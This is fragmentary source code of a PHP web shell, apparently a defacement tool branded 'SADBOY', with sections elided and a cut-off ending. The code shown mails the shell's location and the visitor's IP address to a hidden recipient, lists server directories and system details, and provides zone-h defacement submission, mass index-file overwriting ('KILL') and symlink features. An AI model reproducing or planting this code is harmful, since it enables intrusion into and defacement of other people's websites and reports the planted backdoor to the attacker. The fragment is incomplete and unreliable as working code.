...
$nullll = 'nullllllllllllllll';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$null_alert = "fix $x_path :p *nullll : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($nullll, "nulllll", $nullllll, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
}
}
echo '<!DOCTYPE HTML>
<html>
...
<body>
<h1><center><img src="https://c.top4top.net/p_11004tbku0.gif" height="350 width="350"><font color="white" face=""><div class="lazy">SADBOY</font></center></h1>
...
echo '<font color="white">Berhasil bang</font><br />';
}else{
echo '<font color="red">Gagal bang</font><br/>';
}
}
	if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
...
echo "System : <font color=chartreuse>".$kernel."</font><br>";
echo "Ip Address : <font color=chartreuse>".$ip_web."</font><br>";
echo "<center>";
echo "<hr>";
echo "[ <a href='?'>Home</a> ]";
...
if($_GET['to'] == 'zoneh') {
	if($_POST['submit']) {
		...
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value=''><br>
		<u>Domains</u>: <br>
	...
	<input type='text' name='d_file' value='cutnaila.htm' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Index File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'></textarea><br>
	<input type='submit' name='start' value='KILL' style='width: 450px;'>
	</form></center>";
	} 
	}elseif($_GET['to'] == 'sym') {
echo '<hr>';
...
echo '<center><br/>GansP3opl3</center>
</body>
</html>';
function perms($file){
